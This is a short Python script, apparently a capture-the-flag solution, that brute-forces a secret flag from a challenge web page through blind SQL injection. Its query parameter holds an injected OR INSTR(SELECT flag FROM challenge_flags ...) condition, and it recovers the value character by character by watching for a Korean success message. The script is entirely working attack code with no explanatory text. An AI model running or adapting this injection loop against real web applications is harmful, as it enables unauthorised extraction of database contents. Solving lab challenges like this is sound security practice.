import requests

url = "http://100.83.178.9/challenges/blind-notice.php"
chars = "}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
flag = "FLAG{"

while not flag.endswith("}"):
    found = False

    for ch in chars:
        test = flag + ch
        payload = "__nohit__%' OR INSTR(BINARY (SELECT flag FROM challenge_flags WHERE challenge_id='blind-notice'), BINARY '%s') > 0 -- " % test
        r = requests.get(url, params={"q": payload}, timeout=5)

        if "조건에 맞는 공지가 존재합니다." in r.text:
            flag += ch
            print(flag)
            found = True
            break

    if not found:
        print("더 이상 맞는 글자를 찾지 못했습니다.")
        break